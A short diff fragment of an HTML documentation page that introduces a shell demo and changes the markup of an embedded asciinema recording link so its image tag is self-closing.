+</div>
+
 <p>Here our shell</p>
 
-<p><a href="https://asciinema.org/a/5w0n434idg7l3jfnuak0vmews"><img src="https://asciinema.org/a/5w0n434idg7l3jfnuak0vmews.png" alt="asciicast"></a> </p>
+<p><a href="https://asciinema.org/a/5w0n434idg7l3jfnuak0vmews"><img src="https://asciinema.org/a/5w0n434idg7l3jfnuak0vmews.png" alt="asciicast" /></a></p>
 
 </div>
 
